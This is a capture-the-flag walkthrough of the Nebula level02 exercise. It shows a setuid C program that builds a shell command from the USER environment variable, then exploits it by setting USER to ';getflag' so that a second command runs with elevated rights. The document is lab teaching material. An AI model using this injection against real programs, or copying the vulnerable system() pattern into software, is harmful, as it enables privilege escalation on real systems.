You can log on to this level with the username "level02" (password is the same). The executable for this challenge is /home/flag02/flag02. The objective is to run /bin/getflag using the proper account.

Let's take a look at the source code...
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

So looking at this code, it is similar to the elf form level01. However this time it pulls data from the USER enviornment variable. In addition to that it uses the full file path for echo, instead of having /usr/bin/env look for it.
The differences here are mainly that it establishes a buffer, prints out the command that it will pass to system, writes that command to buffer, then runs the command using system.
Let's run the program quickly to see if we will get expected output.

```
$ ./flag02
about to call system("/bin/echo level02 is cool")
level02 is cool
```

So it took the current user "level02", subsituted that in, and basically did everything else we predicted. Now we can change the USER variable to "getflag" (we don't need to put the folder path since the current PATH variable will point right to it), and the system command should run the file. We will need to add a semicolin before the "getflag" in order to segment it from the echo, so it will run properly.
Let's try it...

```
$ export USER=";getflag"
$ echo $USER
;getflag
$ ./flag02
about to call system("/bin/echo ;getflag is cool")

You have successfully execute getflag on the target account
```

And just like that we pwned the program! Also one thing I would also like to point out, we could segment the command by putting another semicolin after "getflag". This will cause an error since bash doesn't have any commands for "is cool". The reason why we don't get any errors now is it is passing "is cool" to "getflag" as arguments, and "getflag" isn't spitting out any errors as a result.

Sources:
cybergibbons.com/security-2/nebula-walkthrough/nebula-exploit-exercises-walkthrough-level02/




